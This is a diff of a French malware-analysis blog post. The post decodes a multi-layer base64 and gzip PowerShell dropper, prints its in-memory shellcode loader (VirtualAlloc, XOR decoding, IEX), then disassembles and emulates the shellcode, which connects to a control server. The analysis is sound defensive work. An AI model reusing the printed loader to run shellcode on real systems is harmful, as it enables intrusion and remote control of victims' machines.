@@ -37,7 +37,7 @@ A la vue du résultat, les nombreux "\x00" nous ammènent à penser que la chaî
 
 Nous obtenons un script Powershell qui semble contenir encore une couche d'encodage de base64.
 
-Rebelotte, décodons la chaîne en base 64 avec Python.
+Rebelotte, décodons la chaîne en base64 avec Python.
 
 ```python
 >>> data = "H4sIAAAAAAAAAK1W73PaOBP+HP4KfciM7SlQEnJp6E1mym/MC4TGJKHlGEbIMjERFkiyw[REDACTED]"
@@ -55,7 +55,7 @@ Pas d'UTF-16 cette fois. En revanche, la chaîne est compressée. Dans le code P
 b"Set-StrictMode -Version 2\n\n$DoIt = @'\nfunction func_get_proc_address {\n\tParam ($var_module, $var_procedure)\t\t\n\t$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')\n\t$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))\n\treturn $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))\n}\n\nfunction func_get_delegate_type {\n\tParam (\n\t\t[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,\n\t\t[Parameter(Position = 1)] [Type] $var_return_type = [Void]\n\t)\n\n\t$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])\n\t$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')\n\t$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')\n\n\treturn $var_type_builder.CreateType()\n}\n\n[Byte[]]$var_code = [System.Convert]::FromBase64String('38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0[REDACTED]')\n\nfor ($x = 0; $x -lt $var_code.Count; $x++) {\n\t$var_code[$x] = $var_code[$x] -bxor 35\n}\n\n$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))\n$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)\n[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)\n\n$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))\n$var_runme.Invoke([IntPtr]::Zero)\n'@\n\nIf ([IntPtr]::size -eq 8) {\n\tstart-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job\n}\nelse {\n\tIEX $DoIt\n}\n"
 ```
 
-Nous obtenons alors un script Powershell contenant encore une fois une donnée encodée en base 64. Cependant, une grande partie du code est lisible :
+Nous obtenons alors un script Powershell contenant encore une fois une donnée encodée en base64. Cependant, une grande partie du code est lisible :
 
 ```powershell
 Set-StrictMode -Version 2
@@ -119,7 +119,7 @@ for ($x = 0; $x -lt $var_code.Count; $x++) {
 Write-Output $var_code
 ```
 
-Nous obtenons de cette manière une chaîne décimale, qu'on l'on va convertir en hexadécimal.
+Nous obtenons de cette manière une chaîne décimale, que l'on va convertir en hexadecimal parce que les démcimales, ben c'est pour les humains.
 
 ```
 252 232 130 0 0 0 96 137 229 49 192 100 139 80 48 139 82 12 [REDACTED]
@@ -129,10 +129,20 @@ fc e8 82 00 00 00 60 89 e5 31 c0 64 8b 50 30 8b 52 0c 8b 52 [REDACTED]
 
 # Désassembler le shellcode
 
-Pour comprendre ce que fait notre shellcode, nous pouvons le désassembler avec shellen (https://github.com/merrychap/shellen).
+Pour comprendre ce que fait notre shellcode, nous pouvons le désassembler avec **shellen** (https://github.com/merrychap/shellen).
 
 ![dsm_shellcode1.PNG](/img/decode-shellcode/dsm_shellcode1.PNG)
 
 Les DLLs système occupent toujours la même adresse en mémoire. De cette manière, connaissant leurs emplacements, les shellcodes appellent directement les fonctions qui les interessent en chargeant dynamiquement les fonctions voulues. Il est alors facile de repérer certains patterns. Votre bible à cet instant, c'est la doc Microsoft !
 
 ![dsm_internet.PNG](/img/decode-shellcode/dsm_internet.PNG)
+
+Typiquement, notre shellcode va tout simplement ouvrir une connexion vers un serveur de crontrôle.
+
+# Emuler le shellcode
+
+Si certains ne sont pas à l'aise avec l'assembleur (no shame), il est alors possible d'émuler le shellcode avec **scdbg** (http://sandsprite.com/blogs/index.php?uid=7&pid=152)
+
+![scdbg_shellcode.PNG](/img/decode-shellcode/scdbg_shellcode.PNG)
+
+On bien nos fonction de chargement de wininet et de connexion au serveur de contrôle. En prime, scdbg permet de retrouver directement l'adresse ou l'IP utilisée pour la connexion ainsi que le port. Pratique !
